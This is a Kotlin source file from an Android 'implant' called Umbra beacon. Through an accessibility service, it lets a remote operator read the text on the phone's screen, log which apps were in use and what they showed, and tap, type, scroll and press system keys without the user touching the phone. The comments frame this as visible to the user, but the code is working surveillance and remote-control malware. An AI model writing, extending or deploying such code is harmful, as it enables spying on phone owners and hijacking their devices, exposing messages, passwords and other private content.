package io.umbra.beacon

import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * The window of the phone, seen through the accessibility service.
 *
 * An enabled accessibility service is the most powerful permission a phone
 * can give an application, and the one the user of the phone sees: it is
 * listed in the settings of Android and Android shows a notification while
 * it runs.  The implant says so in the report of the persistence, because a
 * technique the user does not know about is a technique that gets taken
 * away.
 *
 * What the service gives the operator:
 *
 *   * the **text of the screen** the user is looking at (`ui.screen`): the
 *     application in the foreground and the visible text of its window.
 *   * the **log of the windows** that changed (`ui.events`): the package,
 *     the window and the text that came with the event.
 *   * the **hand on the phone** (`ui.tap`, `ui.text`, `ui.scroll`): the
 *     operator can press a button, write into a field and scroll, so the
 *     phone can be driven without the user touching it.
 *   * the **system keys** (`ui.global`): back, home, the recent apps, the
 *     notification shade.
 *
 * Nothing of this is invisible and nothing of it is pretended: the phone
 * answers every request with what it really did, and the task that asks
 * for it says in the report of the persistence that the technique is
 * visible.
 *
 * The bridge between the two halves is this object: the beacon receives
 * the task on its own thread, the service owns the window on the main
 * thread, and the answer travels back through a latch.
 */
object Ui {
    /** The service that owns the window, when the operator enabled it. */
    private val service = AtomicReference<UmbraAccessibilityService?>(null)

    /** The window changes, newest last. */
    private val events = ArrayList<String>()

    /** How many window changes are kept. */
    private const val MAX_EVENTS = 60

    /** How long the operator waits for the service to answer. */
    private const val TIMEOUT_MS = 8000L

    /** The service attaches itself here when Android connects it. */
    fun attach(attached: UmbraAccessibilityService?) {
        service.set(attached)
    }

    /** Whether the accessibility service is enabled right now. */
    fun isEnabled(): Boolean = service.get() != null

    /** One request of the operator, and the answer of the phone. */
    class Request(val action: String, val args: Map<String, String>) {
        /** The latch the answer waits on. */
        val latch = CountDownLatch(1)

        /** What the phone did. */
        @Volatile
        var answer: String = ""

        /** Why the phone could not do it. */
        @Volatile
        var error: String = ""
    }

    /**
     * Ask the service to do something and wait for the answer.
     *
     * The call blocks the thread of the task, not the main thread of the
     * phone: the service does the work on its own thread, and the answer
     * arrives through the latch.
     */
    fun submit(request: Request, timeoutMs: Long = TIMEOUT_MS): String {
        val active = service.get()
            ?: throw IllegalStateException(
                "the accessibility service is not enabled: the operator has to turn " +
                "it on in the settings of the phone",
            )
        active.post(request)
        if (!request.latch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
            throw IllegalStateException("the accessibility service did not answer in time")
        }
        if (request.error.isNotEmpty()) {
            throw IllegalStateException(request.error)
        }
        return request.answer
    }

    /**
     * Record a window change.
     *
     * The log is what the operator reads when the phone was used while
     * nobody was looking: it says which application was in the foreground
     * and what it showed.
     */
    fun record(event: AccessibilityEvent?) {
        if (event == null) {
            return
        }
        val pack = event.packageName?.toString() ?: ""
        val klass = event.className?.toString() ?: ""
        val text = event.text?.joinToString(" ")?.trim() ?: ""
        val line = "$pack | $klass | $text"
        synchronized(events) {
            events.add(line)
            while (events.size > MAX_EVENTS) {
                events.removeAt(0)
            }
        }
    }

    /** The window changes, oldest first. */
    fun log(): List<String> = synchronized(events) { events.toList() }

    // -----------------------------------------------------------------------
    // The tree of the window
    // -----------------------------------------------------------------------

    /** How deep the tree of the window is walked. */
    private const val MAX_DEPTH = 32

    /** How many nodes are visited in one walk. */
    private const val MAX_NODES = 4000

    /**
     * The visible text of the window, as the operator reads it.
     *
     * The walk is breadth first and it stops at a thousand nodes, so a
     * window that builds its tree lazily cannot make the task run for
     * minutes.
     */
    fun screen(root: AccessibilityNodeInfo?): String {
        if (root == null) {
            return "the window is not available\n"
        }
        val out = StringBuilder()
        out.append("package: ").append(root.packageName?.toString() ?: "").append("\n")
        var visited = 0
        val queue = ArrayDeque<Pair<AccessibilityNodeInfo, Int>>()
        queue.add(Pair(root, 0))
        while (queue.isNotEmpty() && visited < MAX_NODES) {
            val (node, depth) = queue.removeFirst()
            visited++
            val text = node.text?.toString()?.trim().orEmpty()
            val description = node.contentDescription?.toString()?.trim().orEmpty()
            val id = node.viewIdResourceName?.toString()?.trim().orEmpty()
            if (text.isNotEmpty() || description.isNotEmpty()) {
                out.append("  ")
                if (id.isNotEmpty()) {
                    out.append("[").append(id).append("] ")
                }
                out.append(text)
                if (description.isNotEmpty() && description != text) {
                    out.append(" (").append(description).append(")")
                }
                out.append("\n")
            }
            if (depth >= MAX_DEPTH) {
                continue
            }
            for (index in 0 until node.childCount) {
                val child = node.getChild(index) ?: continue
                queue.add(Pair(child, depth + 1))
            }
        }
        out.append("nodes: ").append(visited).append("\n")
        return out.toString()
    }

    /**
     * The nodes whose text or description carries the needle.
     *
     * An empty needle matches every node that can be pressed, which is how
     * the operator presses "the first button of the screen".
     */
    fun matches(root: AccessibilityNodeInfo?, needle: String): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        if (root == null) {
            return out
        }
        val wanted = needle.trim().lowercase()
        var visited = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty() && visited < MAX_NODES) {
            val node = queue.removeFirst()
            visited++
            val text = node.text?.toString()?.trim().orEmpty().lowercase()
            val description = node.contentDescription?.toString()?.trim().orEmpty().lowercase()
            val id = node.viewIdResourceName?.toString()?.trim().orEmpty().lowercase()
            val hit = if (wanted.isEmpty()) {
                node.isClickable
            } else {
                text.contains(wanted) || description.contains(wanted) || id.contains(wanted)
            }
            if (hit) {
                out.add(node)
            }
            for (index in 0 until node.childCount) {
                val child = node.getChild(index) ?: continue
                queue.add(child)
            }
        }
        return out
    }

    /**
     * The editable nodes whose text carries the needle.
     *
     * The walk is its own: a field that cannot be pressed is still a
     * field, and the operator has to be able to write into it.
     */
    fun fields(root: AccessibilityNodeInfo?, needle: String): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        if (root == null) {
            return out
        }
        val wanted = needle.trim().lowercase()
        var visited = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty() && visited < MAX_NODES) {
            val node = queue.removeFirst()
            visited++
            if (node.isEditable) {
                val text = node.text?.toString()?.trim().orEmpty().lowercase()
                val id = node.viewIdResourceName?.toString()?.trim().orEmpty().lowercase()
                if (wanted.isEmpty() || text.contains(wanted) || id.contains(wanted)) {
                    out.add(node)
                }
            }
            for (index in 0 until node.childCount) {
                val child = node.getChild(index) ?: continue
                queue.add(child)
            }
        }
        return out
    }

    /** A short description of a node, for the report. */
    fun describe(node: AccessibilityNodeInfo?): String {
        if (node == null) {
            return "nothing"
        }
        val text = node.text?.toString()?.trim().orEmpty()
        val description = node.contentDescription?.toString()?.trim().orEmpty()
        val id = node.viewIdResourceName?.toString()?.trim().orEmpty()
        val parts = ArrayList<String>()
        if (id.isNotEmpty()) {
            parts.add(id)
        }
        if (text.isNotEmpty()) {
            parts.add(text)
        } else if (description.isNotEmpty()) {
            parts.add(description)
        }
        if (parts.isEmpty()) {
            parts.add(node.className?.toString() ?: "node")
        }
        return parts.joinToString(" ")
    }

    /** The bundle that writes a text into an editable node. */
    fun textBundle(value: String): Bundle = Bundle().apply {
        putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            value,
        )
    }

    /** The name of the service, for the report. */
    fun component(): String = UmbraAccessibilityService.COMPONENT
}
